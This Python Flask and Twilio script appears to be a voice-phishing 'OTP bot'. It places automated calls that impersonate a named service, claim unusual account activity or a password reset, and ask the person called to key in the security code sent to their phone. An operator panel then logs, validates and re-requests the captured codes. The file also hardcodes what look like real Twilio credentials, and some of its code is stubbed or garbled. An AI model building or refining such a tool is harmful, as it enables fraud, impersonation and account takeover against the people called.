from flask import Flask, request, render_template, jsonify
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client

app = Flask(__name__)

# Hardcoded Twilio credentials
ACCOUNT_SID = 'AC24e6c0f066fceddcc320d1201efbca61'
AUTH_TOKEN = 'a58b6d062689bc2e356ab5bb091820e0'
TWILIO_PHONE_NUMBER = '+17402272053'

client = Client(ACCOUNT_SID, AUTH_TOKEN)

# Call log and OTP status dictionary
call_log = {}
otp_verification = {}

@app.route('/')
def index():
    return render_template('index.html', call_log=call_log)

@app.route('/make_call', methods=['POST'])
def make_call():
    customer_name = request.form['customer_name']
    customer_phone = request.form['customer_phone']
    service_name = request.form['service_name']
    message_type = request.form['message_type']
    custom_message = request.form.get('custom_message', '')
    otp_length = request.form.get('otp_length', 6)

    call = client.calls.create(
        to=customer_phone,
        from_=TWILIO_PHONE_NUMBER,
        url=f'/voice?customer_name={customer_name}&service_name={service_name}&message_type={message_type}&custom_message={custom_message}&otp_length={otp_length}',
        status_callback=f'/status_callback?customer_name={customer_name}',
        status_callback_event=['initiated', 'ringing', 'answered', 'completed']
    )

    call_log[call.sid] = {'name': customer_name, 'status': 'Call initiated', 'otp': None}
    return jsonify({'status': 'Call initiated', 'call_sid': call.sid})

@app.route('/status_callback', methods=['POST'])
def status_callback():
    call_sid = request.form['CallSid']
    call_status = request.form['CallStatus']
    answered_by = request.form.get('AnsweredBy', '')

    if call_status == 'initiated':
        call_log[call_sid]['status'] = 'Call initiated'
    elif call_status == 'ringing':
        call_log[call_sid]['status'] = 'Ringing'
    elif call_status == 'answered':
        if answered_by == 'human':
            call_log[call_sid]['status'] = 'Answered by human'
        elif answered_by == 'machine':
            call_log[call_sid]['status'] = 'Answered by voicemail'
    elif call_status == 'completed':
        call_log[call_sid]['status'] = 'Call completed'

    return '', 200

@app.route('/voice', methods=['POST'])
def voice_response():
    customer_name = request.args['customer_name']
    service_name = request.args['service_name']
    message_type = request.args['message_type']
    custom_message = request.args.get('custom_message', '')
    otp_length = int(request.args.get('otp_length', 6))
    call_sid = request.form['CallSid']

    response = VoiceResponse()
    gather = Gather(action=f'/gather?otp_length={otp_length}', num_digits=1, method='POST')

    if message_type == 'unusual_activity':
        gather.say(f"Hello, {customer_name}. This is an automated message from {service_name}. We've noticed unusual activity on your account. Please press 1 to continue.")
    elif message_type == 'password_reset':
        gather.say(f"Hello, {customer_name}. This is an automated message from {service_name}. We've received a request to reset your password. If it's not you, please press 1.")
    elif message_type == 'custom':
        if custom_message:
            gather.say(custom_message.replace("{name}", customer_name).replace("{service}", service_name))
        else:
            gather.say("There is no custom message set.")

    call_log[call_sid]['status'] = 'Message delivered, waiting for input'
    response.append(gather)
    return str(response)

@app.route('/gather', methods=['POST'])
def gather_response():
    digits = request.form['Digits']
    call_sid = request.form['CallSid']
    otp_length = int(request.args.get('otp_length', 6))
    response = VoiceResponse()

    if digits == '1':
        otp_code = ''.join(['1'] * otp_length)  # Replace with real OTP logic
        otp_verification[call_sid] = otp_code
        call_log[call_sid]['status'] = f'Customer pressed 1, waiting for {otp_length}-digit OTP'
        call_log[call_sid]['otp'] = otp_code
        response.say(f"The block this request, please enter the {otp_length} digit security code that we have sent to your mobile device.")
    else:
        response.say("We didn't receive a valid input. Goodbye.")
        response.hangup()

    return str(response)

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    call_sid = request.form['call_sid']
    otp_input = request.form['otp_input']
    
    response = VoiceResponse()
    if call_sid in otp_verification:
        if otp_input == otp_verification[call_sid]:
            call_log[call_sid]['status'] = 'OTP Verified'
            response.say("Thank you for your cooperation.")
        else:
            call_log[call_sid]['status'] = 'OTP Invalid'
            response.say(f"Your code was incorrect. Please enter the {len(otp_verification[call_sid])} digit security code that we have sent to your mobile device.")
            response.redirect(f'/gather?otp_length={len(otp_verification[call_sid])}')
    
    return str(response)

@app.route('/validate_code', methods=['POST'])
def validate_code():
    call_sid = request.form['call_sid']
    is_valid = request.form['is_valid']
    
    if call_sid in call_log:
        if is_valid == 'valid':
            call_log[call_sid]['status'] = 'OTP Validated, proceeding'
        else:
            call_log[call_sid]['status'] = 'OTP Invalid, retrying'

    return jsonify({'status': 'OTP status updated'})

@app.route('/end_call', methods=['POST'])
def end_call():
    call_sid = request.form['call_sid']
    if call_sid in call_log:
        client.calls(call_sid).update(status='completed')
        call_log[call_sid]['status'] = 'Call ended by user'
        return jsonify({'status': 'Call ended successfully'})
    return jsonify({'status': 'Invalid Call SID'})

if __name__ == '__main__':
    app.run(debug=True)
